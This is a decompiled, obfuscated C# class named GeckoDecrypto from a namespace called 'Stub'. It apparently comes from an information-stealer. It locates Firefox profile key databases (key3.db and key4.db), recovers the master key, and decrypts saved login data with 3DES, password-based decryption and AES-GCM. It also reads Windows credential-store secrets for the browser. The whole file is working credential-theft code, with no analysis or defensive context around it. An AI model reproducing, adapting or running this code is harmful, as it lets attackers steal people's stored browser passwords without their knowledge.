using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;
using dg3ypDAonQcOidMs0w;
using rE4lpnT863QnijKQK5;

namespace Stub
{
	// Token: 0x02000049 RID: 73
	public class GeckoDecrypto
	{
		// Token: 0x06000157 RID: 343 RVA: 0x000103E0 File Offset: 0x0000E5E0
		public GeckoDecrypto(string profilePath)
		{
			hHEYokUTtehNq5ji0d.QgAwAnEzW2N9V();
			this.operational = false;
			this.masterKey = null;
			base..ctor();
			string text = Path.Combine(profilePath, "key3.db");
			string text2 = Path.Combine(profilePath, "key4.db");
			if (File.Exists(text))
			{
				this.masterKey = GeckoDecrypto.GetMasterKeyFromKey3(text);
			}
			else
			{
				if (!File.Exists(text2))
				{
					return;
				}
				this.masterKey = GeckoDecrypto.GetMasterKeyFromKey4(text2);
			}
			this.operational = this.masterKey != null;
		}

		// Token: 0x06000158 RID: 344 RVA: 0x00010458 File Offset: 0x0000E658
		public string Decrypt(byte[] EncryptedData)
		{
			if (!this.operational)
			{
				throw new Exception("this interface is non-operational!");
			}
			ASN1DER.ASN1DERObject asn1DERObject = ASN1DER.Parse(EncryptedData);
			List<ASN1DER.ASN1DERObject> objects = asn1DERObject.objects;
			byte[] array;
			if (objects == null)
			{
				array = null;
			}
			else
			{
				List<ASN1DER.ASN1DERObject> objects2 = objects[0].objects;
				if (objects2 == null)
				{
					array = null;
				}
				else
				{
					List<ASN1DER.ASN1DERObject> objects3 = objects2[1].objects;
					array = ((objects3 != null) ? objects3[1].data : null);
				}
			}
			byte[] array2 = array;
			List<ASN1DER.ASN1DERObject> objects4 = asn1DERObject.objects;
			byte[] array3;
			if (objects4 == null)
			{
				array3 = null;
			}
			else
			{
				List<ASN1DER.ASN1DERObject> objects5 = objects4[0].objects;
				array3 = ((objects5 != null) ? objects5[2].data : null);
			}
			byte[] array4 = array3;
			string text;
			if (array2 == null || array4 == null)
			{
				text = null;
			}
			else
			{
				string text2 = TripleDES.DecryptStringDesCbc(this.masterKey, array2, array4);
				if (text2 == null)
				{
					text = null;
				}
				else
				{
					text = Regex.Replace(text2, "[^ -\u007f]", "");
				}
			}
			return text;
		}

		// Token: 0x06000159 RID: 345 RVA: 0x00010528 File Offset: 0x0000E728
		public string DecryptBase64(string cypherText)
		{
			string text;
			if (cypherText == null)
			{
				text = null;
			}
			else
			{
				byte[] array;
				try
				{
					array = Convert.FromBase64String(cypherText);
				}
				catch
				{
					return null;
				}
				text = this.Decrypt(array);
			}
			return text;
		}

		// Token: 0x0600015A RID: 346 RVA: 0x00010568 File Offset: 0x0000E768
		public static string Decrypt(string profilePath, byte[] EncryptedData)
		{
			string text = Path.Combine(profilePath, "key3.db");
			string text2 = Path.Combine(profilePath, "key4.db");
			byte[] array;
			if (File.Exists(text))
			{
				array = GeckoDecrypto.GetMasterKeyFromKey3(text);
			}
			else
			{
				if (!File.Exists(text2))
				{
					return null;
				}
				array = GeckoDecrypto.GetMasterKeyFromKey4(text2);
			}
			string text3;
			if (array == null)
			{
				text3 = null;
			}
			else
			{
				ASN1DER.ASN1DERObject asn1DERObject = ASN1DER.Parse(EncryptedData);
				List<ASN1DER.ASN1DERObject> objects = asn1DERObject.objects;
				byte[] array2;
				if (objects == null)
				{
					array2 = null;
				}
				else
				{
					List<ASN1DER.ASN1DERObject> objects2 = objects[0].objects;
					if (objects2 == null)
					{
						array2 = null;
					}
					else
					{
						List<ASN1DER.ASN1DERObject> objects3 = objects2[1].objects;
						array2 = ((objects3 != null) ? objects3[1].data : null);
					}
				}
				byte[] array3 = array2;
				List<ASN1DER.ASN1DERObject> objects4 = asn1DERObject.objects;
				byte[] array4;
				if (objects4 == null)
				{
					array4 = null;
				}
				else
				{
					List<ASN1DER.ASN1DERObject> objects5 = objects4[0].objects;
					array4 = ((objects5 != null) ? objects5[2].data : null);
				}
				byte[] array5 = array4;
				if (array3 == null || array5 == null)
				{
					text3 = null;
				}
				else
				{
					string text4 = TripleDES.DecryptStringDesCbc(array, array3, array5);
					if (text4 == null)
					{
						text3 = null;
					}
					else
					{
						text3 = Regex.Replace(text4, "[^ -\u007f]", "");
					}
				}
			}
			return text3;
		}

		// Token: 0x0600015B RID: 347 RVA: 0x00010674 File Offset: 0x0000E874
		public static string DecryptBase64(string profilePath, string cypherText)
		{
			string text;
			if (cypherText == null)
			{
				text = null;
			}
			else
			{
				byte[] array;
				try
				{
					array = Convert.FromBase64String(cypherText);
				}
				catch
				{
					return null;
				}
				text = GeckoDecrypto.Decrypt(profilePath, array);
			}
			return text;
		}

		// Token: 0x0600015C RID: 348 RVA: 0x000106B4 File Offset: 0x0000E8B4
		private static bool ASNContainsBytes(ASN1DER.ASN1DERObject data, byte[] BytesToMatch)
		{
			bool flag;
			if (data.data == null)
			{
				foreach (ASN1DER.ASN1DERObject asn1DERObject in data.objects)
				{
					if (GeckoDecrypto.ASNContainsBytes(asn1DERObject, BytesToMatch))
					{
						return true;
					}
				}
				flag = false;
			}
			else
			{
				flag = Utils.CompareByteArrays(data.data, BytesToMatch);
			}
			return flag;
		}

		// Token: 0x0600015D RID: 349 RVA: 0x00010730 File Offset: 0x0000E930
		private static byte[] GetMasterKeyFromKey4(string path)
		{
			byte[] array = Utils.ForceReadFile(path, false);
			byte[] array2;
			if (array == null)
			{
				array2 = null;
			}
			else
			{
				SqlLite3Parser sqlLite3Parser;
				try
				{
					sqlLite3Parser = new SqlLite3Parser(array);
				}
				catch
				{
					return null;
				}
				if (sqlLite3Parser.ReadTable("metaData"))
				{
					bool flag = false;
					byte[] array3 = null;
					for (int i = 0; i < sqlLite3Parser.GetRowCount(); i++)
					{
						string value = sqlLite3Parser.GetValue<string>(i, "id");
						if (value != null)
						{
							array3 = sqlLite3Parser.GetValue<byte[]>(i, "item1");
							byte[] value2 = sqlLite3Parser.GetValue<byte[]>(i, "item2");
							if (array3 != null && value2 != null)
							{
								ASN1DER.ASN1DERObject asn1DERObject = ASN1DER.Parse(value2);
								byte[] array4 = new byte[]
								{
									42, 134, 72, 134, 247, 13, 1, 12, 5, 1,
									3
								};
								byte[] array5 = new byte[] { 42, 134, 72, 134, 247, 13, 1, 5, 13 };
								if (GeckoDecrypto.ASNContainsBytes(asn1DERObject, array4))
								{
									List<ASN1DER.ASN1DERObject> objects = asn1DERObject.objects;
									byte[] array6;
									if (objects == null)
									{
										array6 = null;
									}
									else
									{
										List<ASN1DER.ASN1DERObject> objects2 = objects[0].objects;
										if (objects2 == null)
										{
											array6 = null;
										}
										else
										{
											List<ASN1DER.ASN1DERObject> objects3 = objects2[0].objects;
											if (objects3 == null)
											{
												array6 = null;
											}
											else
											{
												List<ASN1DER.ASN1DERObject> objects4 = objects3[1].objects;
												array6 = ((objects4 != null) ? objects4[0].data : null);
											}
										}
									}
									byte[] array7 = array6;
									List<ASN1DER.ASN1DERObject> objects5 = asn1DERObject.objects;
									byte[] array8;
									if (objects5 == null)
									{
										array8 = null;
									}
									else
									{
										List<ASN1DER.ASN1DERObject> objects6 = objects5[0].objects;
										array8 = ((objects6 != null) ? objects6[1].data : null);
									}
									byte[] array9 = array8;
									if (array7 == null || array9 == null)
									{
										goto IL_033C;
									}
									byte[] array10 = TripleDES.DecryptByteDesCbc(array3, null, array7, array9);
									if (array10 == null)
									{
										goto IL_033C;
									}
									string text = "password-check";
									string @string = Encoding.GetEncoding("ISO-8859-1").GetString(array10, 0, text.Length);
									if (@string != text)
									{
										goto IL_033C;
									}
									flag = true;
								}
								else
								{
									if (!GeckoDecrypto.ASNContainsBytes(asn1DERObject, array5))
									{
										goto IL_033C;
									}
									List<ASN1DER.ASN1DERObject> objects7 = asn1DERObject.objects;
									byte[] array11;
									if (objects7 == null)
									{
										array11 = null;
									}
									else
									{
										List<ASN1DER.ASN1DERObject> objects8 = objects7[0].objects;
										if (objects8 == null)
										{
											array11 = null;
										}
										else
										{
											List<ASN1DER.ASN1DERObject> objects9 = objects8[0].objects;
											if (objects9 == null)
											{
												array11 = null;
											}
											else
											{
												List<ASN1DER.ASN1DERObject> objects10 = objects9[1].objects;
												if (objects10 == null)
												{
													array11 = null;
												}
												else
												{
													List<ASN1DER.ASN1DERObject> objects11 = objects10[0].objects;
													if (objects11 == null)
													{
														array11 = null;
													}
													else
													{
														List<ASN1DER.ASN1DERObject> objects12 = objects11[1].objects;
														array11 = ((objects12 != null) ? objects12[0].data : null);
													}
												}
											}
										}
									}
									byte[] array12 = array11;
									List<ASN1DER.ASN1DERObject> objects13 = asn1DERObject.objects;
									byte[] array13;
									if (objects13 == null)
									{
										array13 = null;
									}
									else
									{
										List<ASN1DER.ASN1DERObject> objects14 = objects13[0].objects;
										if (objects14 == null)
										{
											array13 = null;
										}
										else
										{
											List<ASN1DER.ASN1DERObject> objects15 = objects14[0].objects;
											if (objects15 == null)
											{
												array13 = null;
											}
											else
											{
												List<ASN1DER.ASN1DERObject> objects16 = objects15[1].objects;
												if (objects16 == null)
												{
													array13 = null;
												}
												else
												{
													List<ASN1DER.ASN1DERObject> objects17 = objects16[2].objects;
													array13 = ((objects17 != null) ? objects17[1].data : null);
												}
											}
										}
									}
									byte[] array14 = array13;
									List<ASN1DER.ASN1DERObject> objects18 = asn1DERObject.objects;
									byte[] array15;
									if (objects18 == null)
									{
										array15 = null;
									}
									else
									{
										List<ASN1DER.ASN1DERObject> objects19 = objects18[0].objects;
										if (objects19 == null)
										{
											array15 = null;
										}
										else
										{
											List<ASN1DER.ASN1DERObject> objects20 = objects19[0].objects;
											if (objects20 == null)
											{
												array15 = null;
											}
											else
											{
												List<ASN1DER.ASN1DERObject> objects21 = objects20[1].objects;
												array15 = ((objects21 != null) ? objects21[3].data : null);
											}
										}
									}
									byte[] array16 = array15;
									if (array12 == null || array14 == null || array16 == null)
									{
										goto IL_033C;
									}
									byte[] array17 = PasswordBasedDecryption.Decrypt(array16, array3, null, array12, array14, 1, 32);
									if (array17 == null)
									{
										goto IL_033C;
									}
									string text2 = "password-check";
									string string2 = Encoding.GetEncoding("ISO-8859-1").GetString(array17, 0, text2.Length);
									if (string2 != text2)
									{
										goto IL_033C;
									}
									flag = true;
								}
								IL_0359:
								if (!flag)
								{
									return null;
								}
								if (!sqlLite3Parser.ReadTable("nssPrivate"))
								{
									return null;
								}
								for (int j = 0; j < sqlLite3Parser.GetRowCount(); j++)
								{
									byte[] value3 = sqlLite3Parser.GetValue<byte[]>(j, "a11");
									if (value3 != null)
									{
										ASN1DER.ASN1DERObject asn1DERObject2 = ASN1DER.Parse(value3);
										List<ASN1DER.ASN1DERObject> objects22 = asn1DERObject2.objects;
										byte[] array18;
										if (objects22 == null)
										{
											array18 = null;
										}
										else
										{
											List<ASN1DER.ASN1DERObject> objects23 = objects22[0].objects;
											if (objects23 == null)
											{
												array18 = null;
											}
											else
											{
												List<ASN1DER.ASN1DERObject> objects24 = objects23[0].objects;
												if (objects24 == null)
												{
													array18 = null;
												}
												else
												{
													List<ASN1DER.ASN1DERObject> objects25 = objects24[1].objects;
													if (objects25 == null)
													{
														array18 = null;
													}
													else
													{
														List<ASN1DER.ASN1DERObject> objects26 = objects25[0].objects;
														if (objects26 == null)
														{
															array18 = null;
														}
														else
														{
															List<ASN1DER.ASN1DERObject> objects27 = objects26[1].objects;
															array18 = ((objects27 != null) ? objects27[0].data : null);
														}
													}
												}
											}
										}
										byte[] array19 = array18;
										List<ASN1DER.ASN1DERObject> objects28 = asn1DERObject2.objects;
										byte[] array20;
										if (objects28 == null)
										{
											array20 = null;
										}
										else
										{
											List<ASN1DER.ASN1DERObject> objects29 = objects28[0].objects;
											if (objects29 == null)
											{
												array20 = null;
											}
											else
											{
												List<ASN1DER.ASN1DERObject> objects30 = objects29[0].objects;
												if (objects30 == null)
												{
													array20 = null;
												}
												else
												{
													List<ASN1DER.ASN1DERObject> objects31 = objects30[1].objects;
													if (objects31 == null)
													{
														array20 = null;
													}
													else
													{
														List<ASN1DER.ASN1DERObject> objects32 = objects31[2].objects;
														array20 = ((objects32 != null) ? objects32[1].data : null);
													}
												}
											}
										}
										byte[] array21 = array20;
										List<ASN1DER.ASN1DERObject> objects33 = asn1DERObject2.objects;
										byte[] array22;
										if (objects33 == null)
										{
											array22 = null;
										}
										else
										{
											List<ASN1DER.ASN1DERObject> objects34 = objects33[0].objects;
											if (objects34 == null)
											{
												array22 = null;
											}
											else
											{
												List<ASN1DER.ASN1DERObject> objects35 = objects34[0].objects;
												if (objects35 == null)
												{
													array22 = null;
												}
												else
												{
													List<ASN1DER.ASN1DERObject> objects36 = objects35[1].objects;
													array22 = ((objects36 != null) ? objects36[3].data : null);
												}
											}
										}
										byte[] array23 = array22;
										if (array19 != null && array21 != null && array23 != null)
										{
											byte[] array24 = PasswordBasedDecryption.Decrypt(array23, array3, null, array19, array21, 1, 32);
											if (array24 != null)
											{
												byte[] array25 = new byte[24];
												if (array25.Length <= array24.Length)
												{
													Array.Copy(array24, array25, array25.Length);
													return array25;
												}
											}
										}
									}
								}
								return null;
							}
						}
						IL_033C:;
					}
					goto IL_0359;
				}
				array2 = null;
			}
			return array2;
		}

		// Token: 0x0600015E RID: 350 RVA: 0x00010C8C File Offset: 0x0000EE8C
		private static T GetFirstItemFromKeyValuePairList<T>(KeyValuePair<string, T>[] keyValuePairs, string key)
		{
			foreach (KeyValuePair<string, T> keyValuePair in keyValuePairs)
			{
				if (keyValuePair.Key == key)
				{
					return keyValuePair.Value;
				}
			}
			return default(T);
		}

		// Token: 0x0600015F RID: 351 RVA: 0x00010CDC File Offset: 0x0000EEDC
		private static bool KeyValuePairListContainsKey<T>(KeyValuePair<string, T>[] keyValuePairs, string key)
		{
			foreach (KeyValuePair<string, T> keyValuePair in keyValuePairs)
			{
				if (keyValuePair.Key == key)
				{
					return true;
				}
			}
			return false;
		}

		// Token: 0x06000160 RID: 352 RVA: 0x00010D1C File Offset: 0x0000EF1C
		private static byte[] GetMasterKeyFromKey3(string path)
		{
			byte[] array = Utils.ForceReadFile(path, false);
			byte[] array2;
			if (array == null)
			{
				array2 = null;
			}
			else
			{
				KeyValuePair<string, byte[]>[] array3 = BerkelyParser.Parse(array);
				if (!GeckoDecrypto.KeyValuePairListContainsKey<byte[]>(array3, "password-check") || !GeckoDecrypto.KeyValuePairListContainsKey<byte[]>(array3, "global-salt"))
				{
					array2 = null;
				}
				else
				{
					byte[] firstItemFromKeyValuePairList = GeckoDecrypto.GetFirstItemFromKeyValuePairList<byte[]>(array3, "password-check");
					byte[] firstItemFromKeyValuePairList2 = GeckoDecrypto.GetFirstItemFromKeyValuePairList<byte[]>(array3, "global-salt");
					int num = (int)firstItemFromKeyValuePairList[1];
					byte[] array4 = new byte[num];
					Array.Copy(firstItemFromKeyValuePairList, 3, array4, 0, num);
					int num2 = firstItemFromKeyValuePairList.Length - (3 + num + 18);
					int num3 = 3 + num + 2 + num2;
					byte[] array5 = new byte[firstItemFromKeyValuePairList.Length - num3];
					Array.Copy(firstItemFromKeyValuePairList, num3, array5, 0, array5.Length);
					byte[] array6 = TripleDES.DecryptByteDesCbc(firstItemFromKeyValuePairList2, null, array4, array5);
					if (array6 == null)
					{
						array2 = null;
					}
					else
					{
						string text = "password-check";
						string @string = Encoding.GetEncoding("ISO-8859-1").GetString(array6, 0, text.Length);
						if (!(@string != text))
						{
							byte[] array7 = null;
							KeyValuePair<string, byte[]>[] array8 = array3;
							int i = 0;
							while (i < array8.Length)
							{
								KeyValuePair<string, byte[]> keyValuePair = array8[i];
								if (!(keyValuePair.Key.ToLower() != "password-check") || !(keyValuePair.Key.ToLower() != "global-salt") || !(keyValuePair.Key.ToLower() != "version"))
								{
									i++;
								}
								else
								{
									array7 = keyValuePair.Value;
									IL_0176:
									if (array7 == null)
									{
										return null;
									}
									ASN1DER.ASN1DERObject asn1DERObject = ASN1DER.Parse(array7);
									List<ASN1DER.ASN1DERObject> objects = asn1DERObject.objects;
									byte[] array9;
									if (objects == null)
									{
										array9 = null;
									}
									else
									{
										List<ASN1DER.ASN1DERObject> objects2 = objects[0].objects;
										if (objects2 == null)
										{
											array9 = null;
										}
										else
										{
											List<ASN1DER.ASN1DERObject> objects3 = objects2[0].objects;
											if (objects3 == null)
											{
												array9 = null;
											}
											else
											{
												List<ASN1DER.ASN1DERObject> objects4 = objects3[1].objects;
												array9 = ((objects4 != null) ? objects4[0].data : null);
											}
										}
									}
									array4 = array9;
									List<ASN1DER.ASN1DERObject> objects5 = asn1DERObject.objects;
									byte[] array10;
									if (objects5 == null)
									{
										array10 = null;
									}
									else
									{
										List<ASN1DER.ASN1DERObject> objects6 = objects5[0].objects;
										array10 = ((objects6 != null) ? objects6[1].data : null);
									}
									byte[] array11 = array10;
									if (array11 == null || array4 == null)
									{
										return null;
									}
									array7 = TripleDES.DecryptByteDesCbc(firstItemFromKeyValuePairList2, null, array4, array11);
									if (array7 == null)
									{
										return null;
									}
									asn1DERObject = ASN1DER.Parse(array7);
									List<ASN1DER.ASN1DERObject> objects7 = asn1DERObject.objects;
									byte[] array12;
									if (objects7 == null)
									{
										array12 = null;
									}
									else
									{
										List<ASN1DER.ASN1DERObject> objects8 = objects7[0].objects;
										array12 = ((objects8 != null) ? objects8[2].data : null);
									}
									array7 = array12;
									if (array7 == null)
									{
										return null;
									}
									asn1DERObject = ASN1DER.Parse(array7);
									byte[] array13 = new byte[24];
									List<ASN1DER.ASN1DERObject> objects9 = asn1DERObject.objects;
									byte[] array14;
									if (objects9 == null)
									{
										array14 = null;
									}
									else
									{
										List<ASN1DER.ASN1DERObject> objects10 = objects9[0].objects;
										array14 = ((objects10 != null) ? objects10[3].data : null);
									}
									byte[] array15 = array14;
									if (array15 == null)
									{
										return null;
									}
									if (array15.Length > array13.Length)
									{
										Array.Copy(array15, array15.Length - array13.Length, array13, 0, array13.Length);
									}
									else
									{
										array13 = array15;
									}
									return array13;
								}
							}
							goto IL_0176;
						}
						array2 = null;
					}
				}
			}
			return array2;
		}

		// Token: 0x06000161 RID: 353 RVA: 0x00011024 File Offset: 0x0000F224
		private static byte[] GetOsKeyStoreKey(string MOZAPPBASENAME)
		{
			string text = MOZAPPBASENAME + " Encrypted Storage";
			IntPtr intPtr;
			byte[] array;
			if (!NativeMethods.CredReadW(text, InternalStructs.CRED_TYPE.GENERIC, 0, out intPtr))
			{
				array = null;
			}
			else
			{
				InternalStructs.CREDENTIALW credentialw = Marshal.PtrToStructure<InternalStructs.CREDENTIALW>(intPtr);
				byte[] array2 = new byte[credentialw.credentialBlobSize];
				Marshal.Copy(credentialw.credentialBlob, array2, 0, array2.Length);
				NativeMethods.CredFree(intPtr);
				array = array2;
			}
			return array;
		}

		// Token: 0x06000162 RID: 354 RVA: 0x00011080 File Offset: 0x0000F280
		public static byte[] OsKeyStoreDecrypt(string MOZAPPBASENAME, byte[] EncryptedData)
		{
			byte[] array;
			if (GeckoDecrypto.osKeyStore.ContainsKey(MOZAPPBASENAME))
			{
				array = GeckoDecrypto.osKeyStore[MOZAPPBASENAME];
			}
			else
			{
				array = GeckoDecrypto.GetOsKeyStoreKey(MOZAPPBASENAME);
				GeckoDecrypto.osKeyStore[MOZAPPBASENAME] = array;
			}
			byte[] array2;
			if (array == null)
			{
				GeckoDecrypto.osKeyStore.Remove(MOZAPPBASENAME);
				array2 = null;
			}
			else
			{
				byte[] array3 = new byte[12];
				Array.Copy(EncryptedData, 0, array3, 0, 12);
				int num = EncryptedData.Length - 12;
				byte[] array4 = new byte[num];
				Array.Copy(EncryptedData, 12, array4, 0, num);
				byte[] array5 = new byte[16];
				byte[] array6 = new byte[num - 16];
				Array.Copy(array4, num - 16, array5, 0, 16);
				Array.Copy(array4, 0, array6, 0, num - 16);
				array2 = AesGcm.Decrypt(array, array3, null, array6, array5);
			}
			return array2;
		}

		// Token: 0x06000163 RID: 355 RVA: 0x00011140 File Offset: 0x0000F340
		public static byte[] OsKeyStoreDecrypt(string MOZAPPBASENAME, string cypherText)
		{
			try
			{
				return GeckoDecrypto.OsKeyStoreDecrypt(MOZAPPBASENAME, Convert.FromBase64String(cypherText));
			}
			catch
			{
			}
			return null;
		}

		// Token: 0x06000164 RID: 356 RVA: 0x00011174 File Offset: 0x0000F374
		public static string GetMOZAPPBASENAMEFromProfilePath(string profilePath)
		{
			string directoryRoot = Directory.GetDirectoryRoot(profilePath);
			while (!File.Exists(Path.Combine(profilePath, "profiles.ini")))
			{
				if (string.Equals(profilePath, directoryRoot, StringComparison.OrdinalIgnoreCase))
				{
					return null;
				}
				profilePath = Path.Combine(profilePath, "..");
				profilePath = Path.GetFullPath(profilePath);
			}
			return new DirectoryInfo(profilePath).Name;
		}

		// Token: 0x06000165 RID: 357 RVA: 0x00003DA8 File Offset: 0x00001FA8
		static GeckoDecrypto()
		{
			WP6RZJql8gZrNhVA9v.prXoP4RuYp();
			hHEYokUTtehNq5ji0d.QgAwAnEzW2N9V();
			GeckoDecrypto.osKeyStore = new Dictionary<string, byte[]>();
		}

		// Token: 0x04000196 RID: 406
		private static Dictionary<string, byte[]> osKeyStore;

		// Token: 0x04000197 RID: 407
		public bool operational;

		// Token: 0x04000198 RID: 408
		private byte[] masterKey;
	}
}
